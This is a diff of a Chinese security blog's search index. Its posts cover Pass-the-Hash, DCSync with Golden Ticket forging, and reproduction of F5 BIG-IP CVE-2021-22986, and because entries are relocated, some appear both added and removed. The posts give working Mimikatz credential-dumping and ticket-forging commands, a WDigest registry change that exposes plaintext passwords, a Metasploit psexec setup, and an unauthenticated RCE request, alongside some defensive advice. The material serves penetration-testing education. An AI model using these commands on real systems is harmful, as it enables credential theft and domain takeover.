+<p>在Windows系统中，通常会使用NTLM身份认证，NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)。攻击者获得有效的用户名和用户密码哈希值后，他们便能够使用该信息通过LM或NTLM身份验证向远程服务器或服务进行身份验证，而无需进行<strong>暴力破解</strong>散列以获取明文密码（此技术发布之前需要此密码）。该攻击利用了身份验证协议中的一种实现缺陷，即每次<strong>会话之间</strong>的密码散列保持静态，直到下次更改密码为止。</p>
+<p>从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash。在Windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，Mimikatz 就读不到密码明文，只能读取哈希值。虽然此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。修改注册表命令为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>
+
+<p>但是，这种方式要求系统重启或者用户重新登录，在实战中操作起来成功率还是比较低的。如果攻击者拥有用户密码的哈希值，则无需强行使用明文密码；他们可以简单地使用他们已经收获的任意用户帐户的哈希值来针对远程系统进行身份验证并模拟该用户。换句话说，从攻击者的角度来看，哈希在功能上等同于生成它们的原始密码。</p>
+<p>因此，攻击者如果使用工具将散列值传递到其他计算机中，进行权限验证，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)，实现对计算机的控制。</p>
+<h2 id="0x02-利用方法"><a href="#0x02-利用方法" class="headerlink" title="0x02 利用方法"></a>0x02 利用方法</h2><h3 id="环境搭配"><a href="#环境搭配" class="headerlink" title="环境搭配"></a>环境搭配</h3><p>域搭建可以参考<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483820&idx=1&sn=f49f393a5698e366df99ddd0d9269829&chksm=c28298b5f5f511a36cd92fb722ce3b0658a9ee6195f5ad3f89266a4dc2ac3f022fdc8d5b578e#rd">Windows组策略提权实验</a></p>
+<p>将一台win7添加到域控（win8）中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160244.png" alt="image-20210214145116625"></p>
+<p>登录一下域账户，之后退出域账户，然后切换为本地账户</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160250.png" alt="image-20210214145726732"></p>
+<p>切换本地账户</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160257.png" alt="image-20210214145957319"></p>
+<h3 id="Mimikatz-交互式获取"><a href="#Mimikatz-交互式获取" class="headerlink" title="Mimikatz 交互式获取"></a>Mimikatz 交互式获取</h3><p>读取lsass进程的信息，获取hash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160302.png" alt="image-20210214152209729"></p>
+<p>获取终端</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:workgroup /ntlm:4075bdc2e63781b034a034102356063a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160306.png" alt="image-20210214152128620"></p>
+<p>会弹出一个交互式的终端,这个终端以及伪造为我们指定的hash和用户，可以直接访问smb服务，我们可以通过copy文件，然后执行计划任务去拿到shell（使用atexec攻击）。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160310.png" alt="image-20210214152835360"></p>
+<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>需要使用<code>exploit/windows/smb/psexec</code></p>
+<p>注意这里填入的哈希是<code>LM Hash:NTLM Hash</code>, 当系统默认不支持LM hash，LM hash可以设定为任意值。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set RHOST 172.16.27.10</span><br><span class="line">set smbuser administrator</span><br><span class="line">set SMBPass 00000000000000000000000000000000:4075bdc2e63781b034a034102356063a</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160316.png" alt="image-20210214154108503"></p>
+<p>当然还有一些其它利用方法，比如：Cobalt Strike 抓取、powershell读取、 SAM表离线获取hash、wmiexec利用hash获取shell等等</p>
+<h2 id="0x03-防范措施"><a href="#0x03-防范措施" class="headerlink" title="0x03 防范措施"></a>0x03 防范措施</h2><h3 id="KB2871997补丁的影响"><a href="#KB2871997补丁的影响" class="headerlink" title="KB2871997补丁的影响"></a>KB2871997补丁的影响</h3><p>防范首先想到打补丁，微软也早在2014年5月发布了KB2871997补丁，该补丁禁止通过本地管理员权限与远程计算机进行连接，其后果就是：无法通过本地管理员权限对远程计算机使用Psexec、WMI、smbecec等，也无法访问远程的文件共享等。</p>
+<p>但实际上就算打了KB2871997补丁后，Administrator账号(SID为500)也是例外的，使用该账户的NTLM Hash依然可以进行哈希传递。</p>
+<blockquote>
+<p>  KB2871997补丁并不能真正防止哈希传递，只是在一定程度上缓解了PTH的问题。</p>
+<p>  浅探内网横向移动-Pass The Hash  <a href="https://xz.aliyun.com/t/8117#toc-11">https://xz.aliyun.com/t/8117#toc-11</a></p>
+<p>  KB22871997是否真的能防御PTH攻击？<a href="https://www.anquanke.com/post/id/193150">https://www.anquanke.com/post/id/193150</a></p>
+</blockquote>
+<h3 id="防御-mimikatz-攻击"><a href="#防御-mimikatz-攻击" class="headerlink" title="防御 mimikatz 攻击"></a>防御 mimikatz 攻击</h3><p>mimikatz在抓取散列值或明文密码时，需要用到Debug权限（因为mimikatz需要和lsass进程进行交互，如果没有Debug权限，mimikatz将不能读取lsass进程里的密码）。而Debug权限归本地管理员Administrator所有,目的是确定哪些用户可以将调试器附加到任何进程或内核中，但一般Administrator不会用到这个权限(除非是系统进程)。<br><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160322.png" alt="image-20210214155950651"></p>
+<p>所以在配置用户权限时，可以将拥有Debug权限的本地管理员从Administrator组中移除。重启系统之后，在运行mimikatz，在第一步”privilege::debug”时就会报错了。</p>
+]]></content>
+      <categories>
+        <category>域渗透</category>
+      </categories>
+      <tags>
+        <tag>Windows提权</tag>
+        <tag>域渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>图形化漏洞利用Demo-JavaFX版</title>
     <url>/2021/03/23/%E5%9B%BE%E5%BD%A2%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8Demo-JavaFX%E7%89%88/</url>
     <content><![CDATA[<h2 id="0x01-这是个嘛？"><a href="#0x01-这是个嘛？" class="headerlink" title="0x01 这是个嘛？"></a>0x01 这是个嘛？</h2><p>这是一个构建图形化漏洞利用的一个项目，已经写好架子，只需要往里填充exp即可，帮助安全人员快速构建一个图形化的、跨平台的漏洞利用工具。</p>
@@ -1808,10 +1859,69 @@
 <h2 id="开心指数"><a href="#开心指数" class="headerlink" title="开心指数"></a>开心指数</h2><p><a href="https://starchart.cc/yhy0/ExpDemo-JavaFX"><img src="https://starchart.cc/yhy0/ExpDemo-JavaFX.svg" alt="Stargazers over time"></a></p>
 ]]></content>
       <categories>
-        <category>GitHub工具</category>
+        <category>开源工具</category>
       </categories>
       <tags>
-        <tag>GitHub工具</tag>
+        <tag>开源工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>域渗透-DCSync和黄金票据</title>
+    <url>/2021/02/21/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/</url>
+    <content><![CDATA[<blockquote>
+<p>  新年开工快乐～～～</p>
+</blockquote>
+<h1 id="域渗透-DCSync和黄金票据"><a href="#域渗透-DCSync和黄金票据" class="headerlink" title="域渗透-DCSync和黄金票据"></a>域渗透-DCSync和黄金票据</h1><h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><blockquote>
+<p>krbtgt账户：每个域控制器都有一个”krbtgt”的用户账户，是KDC的服务账户，用来创建票据授予服务（TGS）  加密的密钥。</p>
+<p>黄金票据（Golden Ticket）：它能让黑客在拥有普通域用户权限和krbtgt hash的情况下，获取域管理员权限。</p>
+<p>DCSync：mimikatz中的功能，能够模拟域控制器并从域控制器导出帐户密码hash。</p>
+</blockquote>
+<p>在域内，不同DC之间，每15分钟都会有一次域数据的同步。实现不登录到域控制器上，而获取域控制器数据库中的数据。</p>
+<p>在DCSync功能出现之前，要想获得域用户的哈希，需要登录域控制器，在域控制器上执行代码才能获得域用户的哈希。2015年8月，新版的mimikatz增加了DCSync的功能，该功能可以模仿一个域控DC，从真实的域控中请求数据，如用户的哈希。该功能最大的特点就是在于不用登陆域服务器，即可远程通过域数据同步复制的方式获得想要的用户口令信息。</p>
+<p>需要注意的是，DCSync攻击的对象如果是只读域控制器(RODC)，则会失效，因为RODC是不能参与复制同步数据到其他DC的。 </p>
+<p>DCSync的原理非常清晰，利用域控制器之间的数据同步复制：</p>
+<ul>
+<li><p>发现网络中的目标域控制器</p>
+</li>
+<li><p>通过DRS服务的GetNCChanges接口发起数据同步请求，Directory Replication Service（DRS）Remote Protocol</p>
+<blockquote>
+<p>GetNCChanges：当一个DC（成为客户端DC）想从其他DC（成为服务端DC）获取数据时，客户端DC会向服务端DC发起一个GetNCChanges请求。回应的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程，毕竟每次回应的数据有限。</p>
+</blockquote>
+</li>
+</ul>
+<p>默认情况下，只有和Domain Controllers和Enterprise Domain Admins权限能够使用DCSync，但我们可以对域内普通用户添加ACL(Access Control List)实现普通用户调用DCSync导出域内所有用户的hash。</p>
+<h2 id="0x02-利用DCSync导出域内用户Hash"><a href="#0x02-利用DCSync导出域内用户Hash" class="headerlink" title="0x02 利用DCSync导出域内用户Hash"></a>0x02 利用DCSync导出域内用户Hash</h2><h4 id="利用条件：获得以下任一的权限"><a href="#利用条件：获得以下任一的权限" class="headerlink" title="利用条件：获得以下任一的权限"></a>利用条件：获得以下任一的权限</h4><ul>
+<li>Administrators组内的用户</li>
+<li>Domain Admins组内的用户</li>
+<li>Enterprise Admins组内的用户</li>
+<li>域控制器的计算机帐户</li>
+</ul>
+<h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>利用DRS(Directory Replication Service)协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据。</p>
+<p>获取相应权限后(这里实验的是域内机器win7，域控为win8上，登录的域内用户yhy)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224807.png" alt="image-20210221165619981"></p>
+<h4 id="使用mimikatz导出指定域用户的信息-包括哈希"><a href="#使用mimikatz导出指定域用户的信息-包括哈希" class="headerlink" title="使用mimikatz导出指定域用户的信息(包括哈希)"></a>使用<code>mimikatz</code>导出指定域用户的信息(包括哈希)</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:test.yhy /user:administrator /csv</span><br><span class="line">lsadump::dcsync /domain:test.yhy /user:administrator</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224813.png" alt="image-20210221171218395"></p>
+<p>获得了域内用户的hash后，进一步利用可参考之前的文章：<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483885&idx=1&sn=edaa58066c4128f53adae0d8f048bff7&chksm=c28298f4f5f511e2e3fc11813896af4f457ba302ee52911562bedac8dd8977fd748e7b9a1982#rd">哈希传递攻击</a></p>
+<h2 id="0x03生成黄金票据，获取域管理权限"><a href="#0x03生成黄金票据，获取域管理权限" class="headerlink" title="0x03生成黄金票据，获取域管理权限"></a>0x03生成黄金票据，获取域管理权限</h2><p>获取<code>krbtgt</code>（域内默认创建的账号）账户Hash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:test.yhy /user:krbtgt /csv</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224823.png" alt="image-20210221223933475"></p>
+<p>生成黄金票据，并使用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /krbtgt:8a4f49ff2d2eedf30b5e565e4332d0b5 /admin:administrator /domain:test.yhy /sid:S-1-5-21-2604854395-1602356619-879117556-502 /ticket:administrator.ticket.bin</span><br><span class="line"></span><br><span class="line">kerberos::ptt administrator.ticket.bin</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224829.png" alt="image-20210221223253549"></p>
+<p>提升到域管理权限成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224837.png" alt="image-20210221223505092"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224841.png" alt="image-20210221223535054"></p>
+<h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h2><p>DCSync攻击的原理是模拟域控制器发起服务器之间的数据同步复制。最好的防御方法是给控制器设置白名单，在域内，域控制器的数量、IP地址、MAC地址是非常明确清晰的资产，将这些资产设置在允许同步的白名单内。非白名单的IP不允许发生数据同步。</p>
+]]></content>
+      <categories>
+        <category>域渗透</category>
+      </categories>
+      <tags>
+        <tag>Windows提权</tag>
+        <tag>域渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -1876,69 +1986,10 @@
 <p><a href="https://codeql.github.com/">https://codeql.github.com/</a></p>
 ]]></content>
       <categories>
-        <category>GitHub工具</category>
+        <category>开源工具</category>
       </categories>
       <tags>
-        <tag>GitHub工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>域渗透-DCSync和黄金票据</title>
-    <url>/2021/02/21/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/</url>
-    <content><![CDATA[<blockquote>
-<p>  新年开工快乐～～～</p>
-</blockquote>
-<h1 id="域渗透-DCSync和黄金票据"><a href="#域渗透-DCSync和黄金票据" class="headerlink" title="域渗透-DCSync和黄金票据"></a>域渗透-DCSync和黄金票据</h1><h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><blockquote>
-<p>krbtgt账户：每个域控制器都有一个”krbtgt”的用户账户，是KDC的服务账户，用来创建票据授予服务（TGS）  加密的密钥。</p>
-<p>黄金票据（Golden Ticket）：它能让黑客在拥有普通域用户权限和krbtgt hash的情况下，获取域管理员权限。</p>
-<p>DCSync：mimikatz中的功能，能够模拟域控制器并从域控制器导出帐户密码hash。</p>
-</blockquote>
-<p>在域内，不同DC之间，每15分钟都会有一次域数据的同步。实现不登录到域控制器上，而获取域控制器数据库中的数据。</p>
-<p>在DCSync功能出现之前，要想获得域用户的哈希，需要登录域控制器，在域控制器上执行代码才能获得域用户的哈希。2015年8月，新版的mimikatz增加了DCSync的功能，该功能可以模仿一个域控DC，从真实的域控中请求数据，如用户的哈希。该功能最大的特点就是在于不用登陆域服务器，即可远程通过域数据同步复制的方式获得想要的用户口令信息。</p>
-<p>需要注意的是，DCSync攻击的对象如果是只读域控制器(RODC)，则会失效，因为RODC是不能参与复制同步数据到其他DC的。 </p>
-<p>DCSync的原理非常清晰，利用域控制器之间的数据同步复制：</p>
-<ul>
-<li><p>发现网络中的目标域控制器</p>
-</li>
-<li><p>通过DRS服务的GetNCChanges接口发起数据同步请求，Directory Replication Service（DRS）Remote Protocol</p>
-<blockquote>
-<p>GetNCChanges：当一个DC（成为客户端DC）想从其他DC（成为服务端DC）获取数据时，客户端DC会向服务端DC发起一个GetNCChanges请求。回应的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程，毕竟每次回应的数据有限。</p>
-</blockquote>
-</li>
-</ul>
-<p>默认情况下，只有和Domain Controllers和Enterprise Domain Admins权限能够使用DCSync，但我们可以对域内普通用户添加ACL(Access Control List)实现普通用户调用DCSync导出域内所有用户的hash。</p>
-<h2 id="0x02-利用DCSync导出域内用户Hash"><a href="#0x02-利用DCSync导出域内用户Hash" class="headerlink" title="0x02 利用DCSync导出域内用户Hash"></a>0x02 利用DCSync导出域内用户Hash</h2><h4 id="利用条件：获得以下任一的权限"><a href="#利用条件：获得以下任一的权限" class="headerlink" title="利用条件：获得以下任一的权限"></a>利用条件：获得以下任一的权限</h4><ul>
-<li>Administrators组内的用户</li>
-<li>Domain Admins组内的用户</li>
-<li>Enterprise Admins组内的用户</li>
-<li>域控制器的计算机帐户</li>
-</ul>
-<h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>利用DRS(Directory Replication Service)协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据。</p>
-<p>获取相应权限后(这里实验的是域内机器win7，域控为win8上，登录的域内用户yhy)</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224807.png" alt="image-20210221165619981"></p>
-<h4 id="使用mimikatz导出指定域用户的信息-包括哈希"><a href="#使用mimikatz导出指定域用户的信息-包括哈希" class="headerlink" title="使用mimikatz导出指定域用户的信息(包括哈希)"></a>使用<code>mimikatz</code>导出指定域用户的信息(包括哈希)</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:test.yhy /user:administrator /csv</span><br><span class="line">lsadump::dcsync /domain:test.yhy /user:administrator</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224813.png" alt="image-20210221171218395"></p>
-<p>获得了域内用户的hash后，进一步利用可参考之前的文章：<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483885&idx=1&sn=edaa58066c4128f53adae0d8f048bff7&chksm=c28298f4f5f511e2e3fc11813896af4f457ba302ee52911562bedac8dd8977fd748e7b9a1982#rd">哈希传递攻击</a></p>
-<h2 id="0x03生成黄金票据，获取域管理权限"><a href="#0x03生成黄金票据，获取域管理权限" class="headerlink" title="0x03生成黄金票据，获取域管理权限"></a>0x03生成黄金票据，获取域管理权限</h2><p>获取<code>krbtgt</code>（域内默认创建的账号）账户Hash</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:test.yhy /user:krbtgt /csv</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224823.png" alt="image-20210221223933475"></p>
-<p>生成黄金票据，并使用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /krbtgt:8a4f49ff2d2eedf30b5e565e4332d0b5 /admin:administrator /domain:test.yhy /sid:S-1-5-21-2604854395-1602356619-879117556-502 /ticket:administrator.ticket.bin</span><br><span class="line"></span><br><span class="line">kerberos::ptt administrator.ticket.bin</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224829.png" alt="image-20210221223253549"></p>
-<p>提升到域管理权限成功</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224837.png" alt="image-20210221223505092"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224841.png" alt="image-20210221223535054"></p>
-<h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h2><p>DCSync攻击的原理是模拟域控制器发起服务器之间的数据同步复制。最好的防御方法是给控制器设置白名单，在域内，域控制器的数量、IP地址、MAC地址是非常明确清晰的资产，将这些资产设置在允许同步的白名单内。非白名单的IP不允许发生数据同步。</p>
-]]></content>
-      <categories>
-        <category>域渗透</category>
-      </categories>
-      <tags>
-        <tag>Windows提权</tag>
-        <tag>域渗透</tag>
+        <tag>开源工具</tag>
       </tags>
   </entry>
   <entry>
@@ -1969,6 +2020,63 @@
 
 <p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210318204258.png" alt="image-20210318204216768"></p>
 <h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NDU2MTg0Ng==&mid=2247484117&idx=1&sn=2fdab8cbe4b873f8dd8abb35d935d186&chksm=cecfaa8cf9b8239acbc83c363af62c41602cb167c485acc23a9850980044487585e6c408f632&scene=132#wechat_redirect">Apache Solr 任意文件读取漏洞 1Day</a></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞复现-F5 BIG-IP远程代码执行漏洞(CVE-2021-22986)</title>
+    <url>/2021/04/04/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-F5%20BIG-IP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2021-22986)/</url>
+    <content><![CDATA[<blockquote>
+<p>  燕子来时新社，梨花落后清明。</p>
+</blockquote>
+<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>F5 BIG-IP 是美国 F5 公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。</p>
+<p>CVE-2021-22986 该漏洞允许未经身份验证的攻击者通过BIG-IP管理界面和自身IP地址对iControl REST接口进行网络访问，以执行任意系统命令，创建或删除文件以及禁用服务。</p>
+<h2 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h2><table>
+<thead>
+<tr>
+<th align="center">F5 BIG-IP 16.0.0-16.0.1</th>
+<th>F5 BIG-IP 12.1.0-12.1.5.2</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">F5 BIG-IP 15.1.0-15.1.2</td>
+<td>F5 BIG-IQ 7.1.0-7.1.0.2</td>
+</tr>
+<tr>
+<td align="center">F5 BIG-IP 14.1.0-14.1.3.1</td>
+<td>F5 BIG-IQ 7.0.0-7.0.0.1</td>
+</tr>
+<tr>
+<td align="center">F5 BIG-IP 13.1.0-13.1.3.5</td>
+<td>F5 BIG-IQ 6.0.0-6.1.0</td>
+</tr>
+</tbody></table>
+<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p><a href="https://login.f5.com/resource/registerEmail.do">https://login.f5.com/resource/registerEmail.do</a> 注册好后，下载</p>
+<p><a href="https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&pro=big-ip_v16.x&ver=16.0.1&container=16.0.1_Virtual-Edition&path=&file=&B1=I+Accept">https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&amp;pro=big-ip_v16.x&amp;ver=16.0.1&amp;container=16.0.1_Virtual-Edition&amp;path=&amp;file=&amp;B1=I+Accept</a>  选择ova格式的，可以快速使用vm虚拟机打开，安装完后，用户名：root，密码：default，成功登陆后，输入config输入config ，几次回车即可看到当前ip，访问</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144019.png" alt="image-20210404113304697"></p>
+<h4 id="3-1-使用POC攻击"><a href="#3-1-使用POC攻击" class="headerlink" title="3.1 使用POC攻击"></a>3.1 使用POC攻击</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mgmt/tm/util/bash HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Authorization: Basic YWRtaW46QVNhc1M=</span><br><span class="line">X-F5-Auth-Token: </span><br><span class="line">Host: 192.168.1.191</span><br><span class="line">Content-Length: 39</span><br><span class="line"></span><br><span class="line">&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c id&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144015.png" alt="image-20210404111524871"></p>
+<h2 id="0x04-利用工具编写"><a href="#0x04-利用工具编写" class="headerlink" title="0x04 利用工具编写"></a>0x04 利用工具编写</h2><p>直接使用上次的<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483987&idx=1&sn=2ee31ccbf8588c23e4184fcd3ab251f8&chksm=c2829b4af5f5125c563e437263eec4ebac08f32f2ace3e4bed9f5c8e562bac5299260b847c27#rd">图形化漏洞利用工具</a>编写</p>
+<blockquote>
+<p>图形化漏洞利用工具已更新</p>
+<p>项目地址：<a href="https://github.com/yhy0/ExpDemo-JavaFX">https://github.com/yhy0/ExpDemo-JavaFX</a></p>
+<p>V1.1 </p>
+<p>​	参考冰蝎的代理，添加代理设置，方便走burp调试</p>
+<p>​	优化批量检查逻辑，使用接口，这样每次添加新的漏洞利用时，就不需要修改批量检查的逻辑。</p>
+</blockquote>
+<p>在<code>src/main/java/com/yhy/core</code>下新建<code>CVE_2021_22986</code>类，实现<code>ExploitInterface</code>接口，并实现里面的函数，具体填充，直接将项目中的示例<code>CVE_2020_14882</code> 的内容复制过去，修改一下内容，填充payload即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144011.png" alt="image-20210404113814410"></p>
+<p>写完后，进入<code>src/main/java/com/yhy/core/Constants.java</code> 和 <code>src/main/java/com/yhy/tools/Tools.java</code>修改</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144002.png" alt="image-20210404132413838"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144006.png" alt="image-20210404132702066"></p>
+<p>运行即可。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404143957.gif" alt="CVE-2021-22986"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -2097,63 +2205,6 @@
       <tags>
         <tag>漏洞分析</tag>
         <tag>CNCF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>漏洞复现-F5 BIG-IP远程代码执行漏洞(CVE-2021-22986)</title>
-    <url>/2021/04/04/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-F5%20BIG-IP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2021-22986)/</url>
-    <content><![CDATA[<blockquote>
-<p>  燕子来时新社，梨花落后清明。</p>
-</blockquote>
-<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>F5 BIG-IP 是美国 F5 公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。</p>
-<p>CVE-2021-22986 该漏洞允许未经身份验证的攻击者通过BIG-IP管理界面和自身IP地址对iControl REST接口进行网络访问，以执行任意系统命令，创建或删除文件以及禁用服务。</p>
-<h2 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h2><table>
-<thead>
-<tr>
-<th align="center">F5 BIG-IP 16.0.0-16.0.1</th>
-<th>F5 BIG-IP 12.1.0-12.1.5.2</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">F5 BIG-IP 15.1.0-15.1.2</td>
-<td>F5 BIG-IQ 7.1.0-7.1.0.2</td>
-</tr>
-<tr>
-<td align="center">F5 BIG-IP 14.1.0-14.1.3.1</td>
-<td>F5 BIG-IQ 7.0.0-7.0.0.1</td>
-</tr>
-<tr>
-<td align="center">F5 BIG-IP 13.1.0-13.1.3.5</td>
-<td>F5 BIG-IQ 6.0.0-6.1.0</td>
-</tr>
-</tbody></table>
-<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p><a href="https://login.f5.com/resource/registerEmail.do">https://login.f5.com/resource/registerEmail.do</a> 注册好后，下载</p>
